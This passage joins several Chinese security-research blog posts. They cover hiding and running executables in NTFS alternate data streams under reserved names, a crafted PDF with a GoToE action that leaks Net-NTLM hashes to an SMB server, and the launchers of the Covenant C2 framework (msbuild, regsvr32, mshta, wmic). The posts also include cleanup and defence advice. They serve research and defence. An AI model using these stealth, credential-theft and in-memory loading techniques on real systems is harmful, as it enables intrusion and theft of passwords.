<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-5-5/2-4.png" alt="Alt text"></p>

<p>程序执行后，进程名为<code class="language-plaintext highlighter-rouge">test.txt:putty.exe</code></p>

<h3 id="2通过powershell">2、通过powershell</h3>

<p>代码如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ps = new-object System.Diagnostics.Process
$ps.StartInfo.Filename= "c:\test\test.txt:putty.exe"
$ps.StartInfo.RedirectStandardOutput = $True
$ps.StartInfo.UseShellExecute = $False
$ps.start()
</code></pre></div></div>

<h2 id="0x04-常规检测工具">0x04 常规检测工具</h2>
<hr>

<h3 id="1adscheckexe">1、ADSCheck.exe</h3>

<p><strong>下载地址：</strong></p>

<p>https://sourceforge.net/projects/adscheck/</p>

<p><strong>查看ADS：</strong></p>

<p>可查看指定文件夹下所有文件</p>

<p>命令：</p>

<p><code class="language-plaintext highlighter-rouge">ADSCheck.exe c:\test\ads</code></p>

<p>如图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-5-5/3-1.png" alt="Alt text"></p>

<p><strong>删除ADS：</strong></p>

<p>可删除指定路径下的所有ADS</p>

<p>命令：</p>

<p><code class="language-plaintext highlighter-rouge">ADSCheck.exe c:\test\ads /d</code></p>

<p>如图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-5-5/3-2.png" alt="Alt text"></p>

<h3 id="2streamsexe">2、Streams.exe</h3>

<p><strong>下载地址：</strong></p>

<p>https://technet.microsoft.com/en-us/sysinternals/streams.aspx</p>

<p><strong>查看ADS：</strong></p>

<p>查看单个文件</p>

<p>命令：</p>

<p><code class="language-plaintext highlighter-rouge">streams.exe c:\test\ads\test.txt</code></p>

<p>如图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-5-5/3-3.png" alt="Alt text"></p>

<p><strong>删除ADS：</strong></p>

<p>删除单个文件的ADS</p>

<p>命令：</p>

<p><code class="language-plaintext highlighter-rouge">streams.exe -d c:\test\ads\test.txt</code></p>

<p>如图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-5-5/3-4.png" alt="Alt text"></p>

<h3 id="实例测试">实例测试：</h3>

<p>浏览器下载的文件在打开时会弹框提示</p>

<p>如图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-5-5/3-5.png" alt="Alt text"></p>

<p><strong>原因：</strong></p>

<p>下载的文件默认添加adsZone.Identifier:$DATA</p>

<p><strong>验证：</strong></p>

<p>查看ADS：</p>

<p><code class="language-plaintext highlighter-rouge">more &lt; putty_download.exe:Zone.Identifier:$DATA</code></p>

<p>获得内容如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[ZoneTransfer]
ZoneId=3
</code></pre></div></div>

<p>去除ADS：</p>

<p>无法使用more命令，因为putty_download.exe过大，需要分屏显示，导致文件生成失败</p>

<p>可使用streams.exe</p>

<p>去除ADS后，打开文件不再弹框提示</p>

<h2 id="0x05-特殊ads">0x05 特殊ADS</h2>
<hr>

<h3 id="1文件">1、…文件</h3>

<p>创建特殊文件…</p>

<p>命令如下：</p>

<p><code class="language-plaintext highlighter-rouge">type putty.exe &gt; ...:putty.exe</code></p>

<p><code class="language-plaintext highlighter-rouge">wmic process call create c:\test\ads\...:putty.exe</code></p>

<p>putty.exe成功执行,进程名为<code class="language-plaintext highlighter-rouge">...:putty.exe</code></p>

<p><strong>特别的地方：</strong></p>

<p>(1) ADS被隐藏</p>

<ul>
  <li>dir /r无法查询</li>
  <li>工具ADSCheck.exe和streams.exe显示不存在ADS</li>
</ul>

<p>如图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-5-5/4-1.png" alt="Alt text"></p>

<p>(2) 该文件无法被删除</p>

<p>尝试各种方法，无法删除，如图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-5-5/4-2.png" alt="Alt text"></p>

<h3 id="2特殊com文件">2、特殊COM文件</h3>

<p>创建特殊名称文件COM1</p>

<p><strong>注：</strong></p>

<p>经测试，系统目前支持的文件名称为COM1至COM9
必须有前缀<code class="language-plaintext highlighter-rouge">\\.\</code>，否则提示系统找不到指定文件</p>

<p><strong>补充1：</strong></p>

<p>特殊名称<code class="language-plaintext highlighter-rouge">nul</code>也有同样效果,该方法由Evi1cg测试得出</p>

<p><strong>补充2：</strong></p>

<p>其他特殊文件格式也可以隐藏ADS，包括如下格式的后缀名：</p>

<p>CON、AUX、PRN、LPT1、LPT2、LPT3、LPT4、LPT5、LPT6、LPT7、LPT8、LPT9</p>

<p>eg：</p>

<p><code class="language-plaintext highlighter-rouge">type putty.exe &gt; \\.\C:\test\ads\LPT4:putty.exe</code></p>

<p><strong>注：</strong></p>

<p>更多特殊文件名称可参考：</p>

<p>https://docs.microsoft.com/en-us/windows/desktop/FileIO/naming-a-file#naming-conventions</p>

<p><strong>补充3：</strong></p>

<p>也可以使用前缀<code class="language-plaintext highlighter-rouge">\\?\</code>，具有相同效果</p>

<p>命令如下：</p>

<p><code class="language-plaintext highlighter-rouge">type putty.exe &gt; \\.\C:\test\ads\COM1:putty.exe</code></p>

<p><code class="language-plaintext highlighter-rouge">wmic process call create \\.\C:\test\ads\COM1:putty.exe</code></p>

<p><strong>注：</strong></p>

<p><em>执行<code class="language-plaintext highlighter-rouge">wmic process call create c:\test\ads\COM1:putty.exe</code>不会执行程序</em></p>

<p>putty.exe成功执行,进程名为COM1:putty.exe</p>

<p><strong>特别的地方：</strong></p>

<p>(1) ADS被隐藏</p>

<ul>
  <li>dir /r无法查询</li>
  <li>工具ADSCheck.exe和streams.exe显示不存在ADS</li>
</ul>

<p>(2) 无法直接删除</p>

<h3 id="3磁盘根目录">3、磁盘根目录</h3>

<p>管理员权限</p>

<p><code class="language-plaintext highlighter-rouge">type putty.exe &gt;C:\:putty.exe</code>
<code class="language-plaintext highlighter-rouge">wmic process call create C:\:putty.exe</code></p>

<p>putty.exe成功执行,进程名为<code class="language-plaintext highlighter-rouge">:putty.exe</code></p>

<p><strong>特别的地方：</strong></p>

<p>(1) ADS被隐藏</p>

<ul>
  <li>dir /r 无法查到</li>
  <li>使用streams.exe可以查看</li>
</ul>

<p>(2) 无法直接删除</p>

<h2 id="0x06-特殊ads的清除">0x06 特殊ADS的清除</h2>
<hr>

<h3 id="1文件-1">1、…文件</h3>

<p>方法1：</p>

<p>删除该目录下所有文件：</p>

<p><code class="language-plaintext highlighter-rouge">del *.*</code></p>

<p>但是不现实</p>

<p>方式2：</p>

<p>使用短文件名</p>

<p><code class="language-plaintext highlighter-rouge">dir /x</code></p>

<p>如图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-5-5/5-1.png" alt="Alt text"></p>

<p>找到…文件对应的短文件名为<code class="language-plaintext highlighter-rouge">A535~1</code></p>

<p>命令行：</p>

<p><code class="language-plaintext highlighter-rouge">del A535~1</code></p>

<p>成功删除</p>

<h3 id="2特殊com文件-1">2、特殊COM文件</h3>

<p>命令行：</p>

<p><code class="language-plaintext highlighter-rouge">del \\.\C:\test\ads\COM1</code></p>

<h3 id="3磁盘根目录-1">3、磁盘根目录</h3>

<p>使用streams.exe</p>

<p>管理员权限：</p>

<p><code class="language-plaintext highlighter-rouge">streams.exe -d  C:\</code></p>

<h2 id="0x07-防御建议">0x07 防御建议</h2>
<hr>

<p>对于用户来说，如果在系统中发现特殊名称的文件并且无法删除，需要提高警惕，也许其中会包含payload</p>

<p>对照本文，特殊文件及清除方法如下：</p>

<p>(1) …</p>

<p>借助短文件名删除</p>

<p>(2) COM1-COM9</p>

<p>del \.\C:\test\ads\COM1</p>

<p>(3) 磁盘根目录</p>

<p>借助streams.exe查看和删除</p>

<h2 id="0x08-小结">0x08 小结</h2>
<hr>

<p>本文介绍了进一步隐藏ADS的利用技巧，结合攻击方式分享了具体的清除方法和防御建议，希望能够帮助大家</p>

<hr>

<p><a href="https://github.com/3gstudent/feedback/issues/new">LEAVE A REPLY</a></p>


  </div>

  <div class="date">
    Written on May  5, 2017
  </div>

  
</article><article class="post">
  <h1>渗透技巧——利用PDF文件获取Net-NTLM hash</h1>

  <div class="entry">
    <h2 id="0x00-前言">0x00 前言</h2>
<hr>

<p>今年4月，来自CheckPoint的Assaf Baharav公开了一个方法，利用PDF文件的正常功能够窃取Windows系统的NTLM Hash。</p>

<p>具体的说，当用户使用PDF阅读器打开一份恶意的PDF文档，该PDF会向远程SMB服务器发出请求，如果该远程SMB服务器对数据包进行抓取，就能够获得用户Windows系统的Net
 NTLM Hash，通过进一步破解就有可能获得用户系统的明文密码。</p>

<p>然而Microsoft、Adobe和FoxIT对此没有进行针对性的修复。</p>

<p>这个利用方法成功的条件有哪些？没有修复的原因又是什么呢？</p>

<p>本文将要站在技术研究的角度进行介绍</p>

<h2 id="0x01-简介">0x01 简介</h2>
<hr>

<p>本文将要介绍以下内容：</p>

<ul>
  <li>原理和利用思路</li>
  <li>测试POC，生成一个恶意PDF文件</li>
  <li>分析PDF文件格式</li>
  <li>编写脚本实现修改正常PDF文件</li>
  <li>开源代码</li>
</ul>

<h2 id="0x02-原理和利用思路">0x02 原理和利用思路</h2>
<hr>

<p>参考资料：</p>

<p>https://research.checkpoint.com/ntlm-credentials-theft-via-pdf-files/</p>

<h3 id="原理">原理</h3>

<p>PDF规范允许为GoTobe和GoToR条目加载远程内容</p>

<p><strong>直观的理解：</strong></p>

<p>PDF文件可以添加一项功能，请求远程SMB服务器的文件</p>

<p>而我们知道，Windows系统下SMB协议有一个特性：客户端在连接SMB服务器时，默认先使用本机的用户名和密码hash尝试登录，通信协议默认为Net-NTLMv1或者Net-NTLMv2</p>

<p>工具Hashcat提供了字典和暴力破解两种方法来还原Net-NTLMv1和Net-NTLMv2协议中的明文密码</p>

<p>只要在SMB服务器上进行抓包，提取关键数据，就能够获得Hashcat需要的参数，尝试破解</p>

<p>抓包可选择WireShark，对获得的pcap包进行解析，提取关键数据。如果使用Responder可自动提取出关键数据。</p>

<p>之前写过的相关文章：</p>

<p><a href="https://3gstudent.github.io/3gstudent.github.io/Windows%E4%B8%8B%E7%9A%84%E5%AF%86%E7%A0%81hash-NTLM-hash%E5%92%8CNet-NTLM-hash%E4%BB%8B%E7%BB%8D/">《Windows下的密码hash——NTLM hash和Net-NTLM hash介绍》</a></p>

<p><a href="https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-%E5%88%A9%E7%94%A8netsh%E6%8A%93%E5%8F%96%E8%BF%9E%E6%8E%A5%E6%96%87%E4%BB%B6%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%9A%84NTLMv2-Hash/">《渗透技巧——利用netsh抓取连接文件服务器的NTLMv2 Hash》</a></p>

<p><a href="https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-%E5%88%A9%E7%94%A8%E5%9B%BE%E6%A0%87%E6%96%87%E4%BB%B6%E8%8E%B7%E5%8F%96%E8%BF%9E%E6%8E%A5%E6%96%87%E4%BB%B6%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%9A%84NTLMv2-Hash/">《渗透技巧——利用图标文件获取连接文件服务器的NTLMv2 Hash》</a></p>

<p><a href="https://3gstudent.github.io/3gstudent.github.io/Windows%E4%B8%8B%E7%9A%84%E5%AF%86%E7%A0%81hash-Net-NTLMv1%E4%BB%8B%E7%BB%8D/">《Windows下的密码hash——Net-NTLMv1介绍》</a></p>

<p>类似的利用思路：</p>

<p>可参考以下文章：</p>

<p>https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/</p>

<p>介绍了多种文件格式的利用方法</p>

<h3 id="利用思路">利用思路</h3>

<ul>
  <li>构造一份特殊的PDF文档，请求SMB服务器的一份文件</li>
  <li>在SMB服务器上抓包</li>
  <li>用户使用PDF阅读器打开PDF文档时，Windows系统将当前用户的Net NTLM Hash发送到SMB服务器</li>
  <li>SMB服务器提取出Net NTLM Hash，使用Hashcat进行破解</li>
  <li>还原出用户的明文密码</li>
  <li>根据用户的明文密码尝试进一步利用</li>
</ul>

<h2 id="0x03-测试poc">0x03 测试POC</h2>
<hr>

<p>Assaf Baharav在他的文章中已经公开了POC，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-5-3/2-1.png" alt="Alt text"></p>

<p><strong>注：</strong></p>

<p>图片引用自https://research.checkpoint.com/ntlm-credentials-theft-via-pdf-files/</p>

<p>如果想要直接进行测试，可参考Deepu TV的POC，地址如下：</p>

<p>https://github.com/deepzec/Bad-Pdf</p>

<h3 id="实际测试">实际测试</h3>

<p>Client:</p>

<ul>
  <li>IP: 192.168.62.135</li>
  <li>OS: Win7 x86</li>
</ul>

<p>SMB Server：</p>

<ul>
  <li>IP: 192.168.62.139</li>
  <li>OS: Win8 x86</li>
  <li>开放共享文件夹: test</li>
</ul>

<h4 id="1使用bad-pdf生成pdf文件">1、使用Bad-Pdf生成PDF文件</h4>

<p>本次测试对Bad-Pdf.py做部分修改，不执行Responder</p>

<p>设置host IP: <code class="language-plaintext highlighter-rouge">192.168.62.139</code></p>

<p>协议选择<code class="language-plaintext highlighter-rouge">SMB</code></p>

<p>如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-5-3/2-2.png" alt="Alt text"></p>

<p>生成测试PDF文件<code class="language-plaintext highlighter-rouge">badpdf.pdf</code></p>

<h4 id="2smbserver进行抓包">2、SMBServer进行抓包</h4>

<p>开启Wireshark</p>

<h4 id="3clinet使用adobe-reader打开badpdfpdf">3、Clinet使用Adobe Reader打开badpdf.pdf</h4>

<h4 id="4查看wireshark成功获得net-ntlm-hash的数据包">4、查看Wireshark，成功获得Net NTLM Hash的数据包</h4>

<p>如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-5-3/2-3.png" alt="Alt text"></p>

<h2 id="0x04-poc细节分析">0x04 POC细节分析</h2>
<hr>

<p>参考代码：</p>

<p>https://github.com/deepzec/Bad-Pdf/blob/master/badpdf.py</p>

<p>Assaf Baharav的POC是在脚本中写好了PDF文件的模板</p>

<p>下面对其中的关键代码进行说明：</p>

<p>(1)</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>2 0 obj
&lt;&lt;/Type/Pages/Kids[3 0 R]/Count 1&gt;&gt;
endobj
</code></pre></div></div>

<p><code class="language-plaintext highlighter-rouge">/Type /Pages</code>表示对象的类型为页码</p>

<p><code class="language-plaintext highlighter-rouge">/Kids[3 0 R]</code>表示页的对象是3</p>

<p><code class="language-plaintext highlighter-rouge">/Count 1</code>表示页码数量为1</p>

<p>(2)</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>3 0 obj
&lt;&lt;/Type/Page/Parent 2 0 R/MediaBox[0 0 612 792]/Resources&lt;&lt;&gt;&gt;&gt;&gt;
endobj
</code></pre></div></div>

<p><code class="language-plaintext highlighter-rouge">/Parent 2 0 R</code>表示父对象是2，同(1)中<code class="language-plaintext highlighter-rouge">/Kids[3</code>对应</p>

<p><code class="language-plaintext highlighter-rouge">/MediaBox</code>表示页面的显示大小（以象素为单位）</p>

<p>(3)</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>xref
0 4
0000000000 65535 f
0000000015 00000 n
0000000060 00000 n
0000000111 00000 n
</code></pre></div></div>

<p><code class="language-plaintext highlighter-rouge">xref</code>表示这部分为交叉引用表</p>

<p><code class="language-plaintext highlighter-rouge">0 4</code>表示下面各行所描述的对象号是从0开始，并且有4个对象</p>

<p><code class="language-plaintext highlighter-rouge">0000000000 65535 f</code>固定格式，可看作文件头</p>

<p><code class="language-plaintext highlighter-rouge">0000000015 00000 n</code>对应第一个对象，<code class="language-plaintext highlighter-rouge">0000000015</code>表示偏移地址(十进制);<code class="language-plaintext highlighter-rouge">00000</code>为5位产生号（最大为65535），0表明该对象未被修改过; n表示该对象在使用，如果为f，表示该对象为free</p>

<p>(4)</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>trailer
&lt;&lt;/Size 4/Root 1 0 R&gt;&gt;
startxref
190

...中间省略的代码...

trailer
&lt;&lt;
	/Root 1 0 R
&gt;&gt;
%%EOF

</code></pre></div></div>

<p><code class="language-plaintext highlighter-rouge">trailer</code>表示文件尾trailer对象的开始</p>

<p><code class="language-plaintext highlighter-rouge">/Size 4</code>表示该PDF文件的对象数目为4</p>

<p><code class="language-plaintext highlighter-rouge">/Root 1 0 R</code>表示根对象的对象号为1</p>

<p><code class="language-plaintext highlighter-rouge">startxref 190</code>表示交叉引用表的偏移地址为190</p>

<p><code class="language-plaintext highlighter-rouge">%%EOF</code>表示文件结束标志</p>

<p>(5)</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>3 0 obj
&lt;&lt; /Type /Page
   /Contents 4 0 R
   /AA &lt;&lt;
	   /O &lt;&lt;
	      /F (''' + host + '''test)
		  /D [ 0 /Fit]
		  /S /GoToE
		  &gt;&gt;
	   &gt;&gt;
	   /Parent 2 0 R
	   /Resources &lt;&lt;
			/Font &lt;&lt;
				/F1 &lt;&lt;
					/Type /Font
					/Subtype /Type1
					/BaseFont /Helvetica
					&gt;&gt;
				  &gt;&gt;
				&gt;&gt;
&gt;&gt;
endobj
</code></pre></div></div>

<p>此处为关键代码，实现远程访问</p>

<p><code class="language-plaintext highlighter-rouge">/Contents 4 0 R</code>表示页面内容对象的对象号为4</p>

<p><code class="language-plaintext highlighter-rouge">/Parent 2 0 R</code>表示父对象是2</p>

<p>在<code class="language-plaintext highlighter-rouge">/Contents 4 0 R</code>和<code class="language-plaintext highlighter-rouge">/Parent 2 0 R</code>直接为实现远程访问的代码</p>

<p>对于PDF文件格式，不需要换行符，所以这段代码去掉换行符和空格，填入ServerIP后为<code class="language-plaintext highlighter-rouge">/AA &lt;&lt;/O &lt;&lt;/F (\\\\192.168.62.139\\test)/D [ 0 /Fit]/S /GoToE&gt;&gt;&gt;&gt;</code></p>

<h2 id="0x05-修改正常pdf文件">0x05 修改正常PDF文件</h2>
<hr>

<p>接下来，尝试修改正常的文件，添加代码，实现远程访问功能</p>

<p>使用工具生成的PDF文件一般都很大，分析格式不是很方便，这里提供一个python生成PDF的参考代码，地址如下：</p>

<p>http://code.activestate.com/recipes/189858/</p>

<p>输入txt文件，输出pdf文件</p>

<h3 id="实际测试-1">实际测试</h3>

<p>1.txt的内容为：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>1234567
</code></pre></div></div>

<p>cmd:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>recipe-189858-1.py 1.txt
</code></pre></div></div>

<p>生成的pdf文件<code class="language-plaintext highlighter-rouge">1.txt.pdf</code>，文件大小1213 bytes</p>

<p>查看1.txt.pdf的文件格式，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-5-3/3-1.png" alt="Alt text"></p>

<p>在<code class="language-plaintext highlighter-rouge">/Parent 3 0 R</code>和<code class="language-plaintext highlighter-rouge">/Resources 5 0 R</code>直接添加代码<code class="language-plaintext highlighter-rouge">/AA &lt;&lt;/O &lt;&lt;/F (\\\\192.168.62.139\\test)/D [ 0 /Fit]/S /GoToE&gt;&gt;&gt;&gt;</code></p>

<p><strong>注:</strong></p>

<p>需要十六进制编辑，使用文本编辑会导致PDF文件出错</p>

<p>对PDF文件添加上述代码后，交叉引用表中对象的偏移位置会出现偏差，需要重新计算，修正偏移位置</p>

<p>使用Adobe Reader打开修改后的文件<code class="language-plaintext highlighter-rouge">1.txt.pdf</code>，SMB服务器成功抓到Net NTLM Hash，修改成功</p>

<h2 id="0x06-脚本编写">0x06 脚本编写</h2>
<hr>

<p>经实际测试，不修正交叉引用表中对象的偏移位置，不会影响PDF文件的正常访问</p>

<p>所以脚本编写上只需要定位<code class="language-plaintext highlighter-rouge">/Parent &lt;n&gt; 0 R</code>后，添加访问远程文件的代码即可</p>

<p>值得注意的是PDF文件的读取和写入需要以二进制格式</p>

<p>实现代码已开源，可参考：</p>

<p>https://github.com/3gstudent/Worse-PDF</p>

<h2 id="0x07-利用分析">0x07 利用分析</h2>
<hr>

<p>成功利用需要满足以下条件：</p>

<ul>
  <li>用户使用PDF阅读器打开，如果使用IE或是Chrome打开PDF文件，并不会执行</li>
</ul>

<p>对于Windows系统，通过Net NTLM Hash破解出明文有一定难度</p>

<p>即使破解出了明文，利用的效果也有限(例如普通用户的Windows系统很少开启远程登录功能)</p>

<h2 id="0x08-防御">0x08 防御</h2>
<hr>

<p>虽然微软并未针对这个利用方法进行针对性的修复，但在之前已经提供了一个防御的方法，参考地址：</p>

<p>https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/ADV170014</p>

<p>但只支持Win10和Server2016</p>

<h2 id="0x09-小结">0x09 小结</h2>
<hr>

<p>本文测试了利用PDF文件获取Net-NTLM hash的方法，分析原理，根据PDF的文件格式尝试编写脚本实现修改正常的PDF文件，开源代码，总结利用条件。</p>

<p>最后，个人也认为Microsoft没有必要对此进行针对性的修复。</p>

<hr>

<p><a href="https://github.com/3gstudent/feedback/issues/new">LEAVE A REPLY</a></p>


  </div>

  <div class="date">
    Written on May  3, 2018
  </div>

  
</article><article class="post">
  <h1>Covenant利用分析</h1>

  <div class="entry">
    <h2 id="0x00-前言">0x00 前言</h2>
<hr>

<p>Covenant是一个.NET开发的C2(command and control)框架，使用.NET Core的开发环境，不仅支持Linux，MacOS和Windows，还支持docker容器。</p>

<p>最特别的地方是支持动态编译，能够将输入的C#代码上传至C2 Server，获得编译后的文件并使用Assembly.Load()从内存进行加载。</p>

<p>本文仅在技术研究的角度，介绍Covenant的细节，分析特点。</p>

<h2 id="0x01-简介">0x01 简介</h2>
<hr>

<p>本文将要介绍以下内容：</p>

<ul>
  <li>Covenant的启动方法</li>
  <li>Covenant的功能介绍</li>
  <li>Covenant的优点</li>
  <li>Covenant的检测</li>
</ul>

<h2 id="0x02-covenant的启动方法">0x02 Covenant的启动方法</h2>
<hr>

<h3 id="1windows系统">1.Windows系统</h3>

<p>需要装对应版本的.NET Core、ASP.NET Core和SDK</p>

<p>经测试，Covenant需要.NET Core 2.2.0、ASP.NET Core 2.2.0和SDK 2.2.101，其他版本会报错</p>

<p>下载地址：</p>

<p>https://dotnet.microsoft.com/download/thank-you/dotnet-sdk-2.2.101-windows-x64-installer</p>

<p>https://dotnet.microsoft.com/download/thank-you/dotnet-runtime-2.2.0-windows-x64-installer</p>

<p>https://dotnet.microsoft.com/download/thank-you/dotnet-runtime-2.2.0-windows-x64-asp.net-core-runtime-installer</p>

<p>安装Git for Windows</p>

<p>https://github.com/git-for-windows/git/releases/download/v2.23.0.windows.1/Git-2.23.0-64-bit.exe</p>

<p>下载并启动：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>git clone --recurse-submodules https://github.com/cobbr/Covenant
cd Covenant/Covenant
dotnet build
dotnet run
</code></pre></div></div>

<p>访问https://localhost:7443进入控制面板，第一次使用时需要注册用户</p>

<p>这里可以注册多个用户，实现团队协作</p>

<p><strong>注：</strong></p>

<p>Elite是与Covenant服务器进行交互的命令行程序，目前已经临时弃用，地址：</p>

<p>https://github.com/cobbr/Elite</p>

<h2 id="0x03-covenant的功能介绍">0x03 Covenant的功能介绍</h2>
<hr>

<p>Covenant支持的功能可参考：</p>

<p>https://github.com/cobbr/Covenant/wiki</p>

<p>这里只介绍个人认为比较重要的部分</p>

<h3 id="1listeners">1.Listeners</h3>

<p>只支持HTTP协议，可以指定url和通信消息的格式</p>

<p>选择<code class="language-plaintext highlighter-rouge">Listeners</code>-&gt;<code class="language-plaintext highlighter-rouge">Profiles</code>，默认包括两个配置模板，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-11-1/2-1.png" alt="Alt text"></p>

<p>配置模板中可以设置多个HttpUrls，Grunt在回连的时候会从HttpUrls中随机选择</p>

<p><strong>注：</strong></p>

<p>Grunt用作部署到目标，作为被控制端</p>

<p>HttpRequest和HttpResponse的内容都可以指定</p>

<p>配置模板对应源码文件的位置： <code class="language-plaintext highlighter-rouge">.\Covenant\Covenant\Data\Profiles</code></p>

<h3 id="2launchers">2.Launchers</h3>

<p>用于启动Grunt，包括以下9种启动方式:</p>

<h4 id="1binary">(1)Binary</h4>

<p>.NET程序集，格式为exe文件</p>

<h4 id="2powershell">(2)PowerShell</h4>

<p>命令行下通过Powershell启动Grunt</p>

<p>将.NET程序集保存在数组，通过Assembly.Load()在内存进行加载</p>

<p>代码示例：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[Reflection.Assembly]::Load(Data).EntryPoint.Invoke(0,$a.ToArray())
</code></pre></div></div>

<h4 id="3msbuild">(3)MSBuild</h4>

<p>命令行下通过msbuild启动Grunt</p>

<p>启动命令示例：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe GruntStager.xml
</code></pre></div></div>

<p>将.NET程序集保存在数组，通过Assembly.Load()在内存进行加载</p>

<p>代码示例：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>System.Reflection.Assembly.Load(oms.ToArray()).EntryPoint.Invoke(0, new object[] { new string[]{ } });
</code></pre></div></div>

<p>关于msbuild的用法可参考之前的文章<a href="https://3gstudent.github.io/3gstudent.github.io/Use-MSBuild-To-Do-More/">《Use MSBuild To Do More》</a></p>

<h4 id="4installutil">(4)InstallUtil</h4>

<p>命令行下通过InstallUtil启动Grunt</p>

<p><strong>注：</strong></p>

<p>我在测试的时候这里产生了bug，生成的文件名称为<code class="language-plaintext highlighter-rouge">GruntStager.xml</code>，里面保存了base64加密的.NET程序集</p>

<p>按照我理解的InstallUtil的用法，这里应该生成一个.cs文件</p>

<p>查看Covenant的源码，生成模板的源码位置：<code class="language-plaintext highlighter-rouge">.\Covenant\Covenant\Models\Launchers\InstallUtilLauncher.cs</code></p>

<p>对应的链接：</p>

<p>https://github.com/cobbr/Covenant/blob/master/Covenant/Models/Launchers/InstallUtilLauncher.cs</p>

<p>模板中包括.cs文件的内容，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-11-1/2-2.png" alt="Alt text"></p>

<p>这里可以将<code class="language-plaintext highlighter-rouge">CodeTemplate</code>的内容另存为.cs文件，并把其中的<code class="language-plaintext highlighter-rouge">""</code>替换成base64加密的.NET程序集，最终保存成test.cs</p>

<p>启动命令示例：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /unsafe /out::file.dll test.cs
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U file.dll
</code></pre></div></div>

<h4 id="5wmic">(5)Wmic</h4>

<p>启动命令示例：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wmic os get /format:"file.xsl"
</code></pre></div></div>

<p><strong>注：</strong></p>

<p>Covenant在此处提示这个方法也许无法在Windows 10和Windows Server 2016下使用</p>

<p>将.NET程序集保存在数组，通过DotNetToJScript的方法在内存进行加载</p>

<p>代码示例：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>var o = delegate.DynamicInvoke(array.ToArray()).CreateInstance('Grunt.GruntStager');
</code></pre></div></div>

<p>关于Wmic的用法可参考之前的文章<a href="https://3gstudent.github.io/3gstudent.github.io/%E5%88%A9%E7%94%A8wmic%E8%B0%83%E7%94%A8xsl%E6%96%87%E4%BB%B6%E7%9A%84%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/">《利用wmic调用xsl文件的分析与利用》</a></p>

<h4 id="6regsvr32">(6)Regsvr32</h4>

<p>启动命令示例：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>regsvr32 /u /s /i:file.sct scrobj.dll
</code></pre></div></div>

<p><strong>注：</strong></p>

<p>Covenant在此处提示这个方法也许无法在Windows 10和Windows Server 2016下使用</p>

<p>将.NET程序集保存在数组，通过DotNetToJScript的方法在内存进行加载</p>

<p>关于Regsvr32的用法可参考之前的文章《Use SCT to Bypass Application Whitelisting Protection》</p>

<h4 id="7mshta">(7)Mshta</h4>

<p>启动命令示例：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mshta file.hta
</code></pre></div></div>

<p><strong>注：</strong></p>

<p>Covenant在此处提示这个方法也许无法在Windows 10和Windows Server 2016下使用</p>

<p>将.NET程序集保存在数组，通过DotNetToJScript的方法在内存进行加载</p>

<p>关于Mshta的用法可参考之前的文章<a href="https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-%E4%BB%8Egithub%E4%B8%8B%E8%BD%BD%E6%96%87%E4%BB%B6%E7%9A%84%E5%A4%9A%E7%A7%8D%E6%96%B9%E6%B3%95/">《渗透技巧——从github下载文件的多种方法》</a></p>

<h4 id="8cscript">(8)Cscript</h4>

<p>启动命令示例：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cscript file.js
</code></pre></div></div>

<p>这里借助了DotNetToJScript，其他内容同上</p>

<h4 id="9wscript">(9)Wscript</h4>

<p>启动命令示例：</p>

